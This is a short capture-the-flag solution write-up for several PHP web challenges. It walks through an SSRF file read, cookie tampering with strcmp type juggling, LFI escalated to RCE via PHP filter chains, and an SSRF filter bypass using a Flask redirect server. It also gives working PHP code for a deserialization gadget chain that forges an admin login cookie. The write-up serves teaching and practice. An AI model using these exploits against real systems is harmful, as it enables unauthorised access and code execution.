# Brief Solution

## web01

## web02
### Installation 🧑🏻‍💻
1. `composer require mpdf/mpdf`

### Step 🍿
Basically, this is just SSRF vulnerability. You can read any file by using `file://` protocol. Sure you can use other method, feel free to study new thing.
1. put this URL on searchbar `file:///var/www/html/flag.php`

## web03
1. Base 64 decode 2 times the cookie value.
2. Change the type to admin and encode again.
3. Exploit the type strcmp loose comparison  by changing password to password[] and get the flag.
## web04
1. user click on About and redirected to page.php?show=about.php
2. show parameter is vulnerable to local file inclusion
3. gain rce via [PHP filters](https://github.com/synacktiv/php_filter_chain_generator)
## web05
### Installation 🧑🏻‍💻
1. `docker-compose up -d`

### Step 🍿
This vulnerability is just the same as web02, but with little bit of filter. This system "generally" check given url:
- is an ip address
- does not request localhost directly
- has valid public url
- and does not have DNS rebinding attack (donno if my filter method works)
So basically we can bypass the filter using URL redirect(302). The idea is we will give valid and public domain, but the domain will redirect it back to localhost 😯.

***There are 3 methods you can use***
1. You can use URL shorterner and points it to `http://127.0.0.1:8081/flag` (only certains works)
2. You can use public domain for localhost testing `http://localtest.me:8081/flag`
3. Or more painfull but it good to understand how it works. 
  - Code below will redirect to `http://127.0.0.1:8081/flag`
```py
from flask import Flask,redirect

app = Flask(__name__)

@app.route("/")
def hello():
	return redirect("http://127.0.0.1:8081/flag")
```
  - spawn python server: `flask run --host=0.0.0.0 --port=1111`
  - spawn ngrok: `ngrok http 1111`
  - paste the url such as https://2025-2001-f40-933-46f6-ac06-5fb6-3208-9d5c.ap.ngrok.io/

## web06

The system passed user's input to `unserialize()` function without sanitization. User can control deserialize method to modify variable in classes to bypass login authentication. Thus, participant needs to create gadget chain( `ManageCookie{}`, `Auth{}`, `DBController{}` ) to control SQL statement in order to bypass auth.
### Step 🍿
1. run the code below.
```php
<?php

class DBController { }

class Auth {
    public $getTokenByUsernameQuery;
    protected $db_handle;

    function __construct() {
        $current_time = time();
        $cookie_expiration_time = $current_time + (30 * 24 * 60 * 60); // for 1 month
        $expiry_date = date("Y-m-d H:i:s", $cookie_expiration_time);

        $password_hash = password_hash("takKisahApaPun", PASSWORD_DEFAULT);
        $selector_hash = password_hash("tulatu", PASSWORD_DEFAULT);

        $this->getTokenByUsernameQuery = "SELECT ? as username, ? as is_expired, '{$password_hash}' as password_hash, '{$selector_hash}' as selector_hash, '{$expiry_date}' as expiry_date, 12 as id";
        $this->db_handle = new DBController();
    }
}

class ManageCookie {
    public $member_login = "ADMIN";
    public $random_password = "takKisahApaPun";
    public $random_selector = "tulatu";
    protected $auth;

    function __construct() {
        $this->auth = new Auth();
    }
}

$p = new ManageCookie();
$p = urlencode(base64_encode(serialize($p)));
echo $p;
```
2. Set "remember_user" cookie and refresh.
